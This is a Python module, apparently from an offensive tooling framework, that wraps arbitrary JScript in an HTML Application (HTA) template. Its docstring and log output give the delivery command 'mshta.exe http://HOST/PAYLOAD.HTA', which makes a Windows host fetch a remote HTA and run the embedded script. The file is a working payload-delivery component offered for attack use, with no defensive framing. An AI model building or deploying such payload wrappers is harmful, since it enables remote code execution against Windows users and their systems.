from lets.__module__ import Module


class HTA(Module):
    """
    Format JScript as an HTML Application (HTA).

    Usage: mshta.exe http://HOST/PAYLOAD.HTA
    """

    @classmethod
    def add_arguments(cls, parser):
        pass

    def handle(self, input):
        assert input is not None, "Must provide jscript as input"

        for data in input:
            yield (self.template % data.decode()).encode()
            self.log.info("Usage: mshta.exe http://HOST/PAYLOAD.HTA")

    template = """<?XML version="1.0"?>
<html>
<head>
<script language="javascript">
%s
</script>
</script>
</head>
<body>
</body>
</html>
"""
